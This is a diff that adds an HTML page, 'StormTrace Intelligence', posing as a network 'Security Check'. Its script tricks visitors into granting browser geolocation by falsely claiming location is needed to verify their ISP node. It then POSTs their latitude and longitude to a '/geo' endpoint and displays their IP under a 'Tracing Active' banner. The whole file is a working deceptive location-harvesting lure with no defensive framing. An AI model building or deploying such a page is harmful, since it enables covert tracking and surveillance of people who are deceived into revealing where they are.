@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>⚡ StormTrace Intelligence</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', monospace; 
+            background: radial-gradient(circle at center, #1b2735 0%, #090a0f 100%);
+            color: #00d2ff; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; overflow: hidden;
+        }
+
+        @keyframes lightning {
+            0%, 95%, 98% { box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); border-color: #30363d; }
+            96%, 99% { box-shadow: 0 0 60px rgba(255, 255, 255, 0.6); border-color: #ffffff; }
+        }
+
+        .container { 
+            background: rgba(22, 27, 34, 0.9); backdrop-filter: blur(15px);
+            padding: 40px; border-radius: 15px; border: 1px solid #30363d; 
+            width: 90%; max-width: 400px; text-align: center;
+            animation: lightning 6s infinite;
+        }
+
+        #dashboard { display: none; }
+        .label { color: #8b949e; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
+        .ip-display { font-size: 32px; font-weight: 900; margin: 15px 0; color: #fff; text-shadow: 0 0 15px #00d2ff; }
+
+        button { 
+            width: 100%; padding: 16px; 
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white; border: none; border-radius: 8px; font-weight: bold; 
+            cursor: pointer; margin-top: 25px; font-size: 14px;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3); transition: 0.3s;
+        }
+
+        button:hover { transform: translateY(-2px); filter: brightness(1.2); }
+        .status-msg { font-size: 12px; color: #8b949e; margin-top: 20px; font-style: italic; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="gate">
+        <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
+        <h1>Security Check</h1>
+        <p style="font-size: 14px; color: #8b949e;">Your node is currently unverified. Complete the <strong>StormTrace Sync</strong> to access the dashboard.</p>
+        <button onclick="verify()">SYNC NETWORK NODE</button>
+        <div class="status-msg" id="status">Required: Location Permission</div>
+    </div>
+
+    <div class="container" id="dashboard">
+        <div class="label">Public Interface</div>
+        <div class="ip-display">{{ user_ip }}</div>
+        <div style="margin-bottom: 25px;"><span style="color: #00d2ff;">●</span> <span class="label" style="color: #00d2ff;">Tracing Active</span></div>
+        <div style="background: #0d1117; padding: 20px; border-radius: 8px; text-align: left; font-size: 13px; border-left: 3px solid #00d2ff;">
+            <div style="color: #fff; margin-bottom: 5px;">> System: <span style="color: #00d2ff;">Encrypted</span></div>
+            <div style="color: #fff; margin-bottom: 5px;">> Node: <span style="color: #00d2ff;">Verified</span></div>
+            <div style="color: #fff;">> Logs: <span style="color: #00d2ff;">Secured</span></div>
+        </div>
+        <button onclick="location.reload()">REFRESH</button>
+    </div>
+
+<script>
+function verify() {
+    const statusText = document.getElementById('status');
+    statusText.innerHTML = "Requesting System Access...";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            statusText.innerHTML = "Authenticating...";
+            fetch('/geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+            }).then(() => {
+                document.getElementById('gate').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+            });
+        }, (err) => {
+            statusText.innerHTML = "<span style='color:#ff4b2b'>Error: Access Denied</span>";
+            alert("Verification Failed. You must allow location to verify your ISP node.");
+        });
+    } else { alert("Browser not supported."); }
+}
+</script>
+</body>
+</html>
